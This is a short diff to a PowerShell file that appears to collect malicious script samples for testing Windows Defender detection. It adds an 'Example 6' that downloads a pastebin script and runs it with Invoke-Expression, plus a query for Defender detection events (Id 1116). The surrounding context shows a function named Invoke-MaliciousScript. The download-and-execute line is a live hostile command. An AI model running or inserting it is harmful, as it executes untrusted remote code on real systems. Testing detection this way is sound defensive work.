@@ -62,3 +62,8 @@ Function Invoke-MaliciousScript {
     Invoke-Expression $output
 }
 Invoke-MaliciousScript
+
+# Example 6
+Invoke-Expression (Invoke-WebRequest https://pastebin.com/raw/JHhnFV8m)
+
+Get-WinEvent 'Microsoft-Windows-Windows Defender/Operational' | Where-Object Id -eq 1116 | Format-List
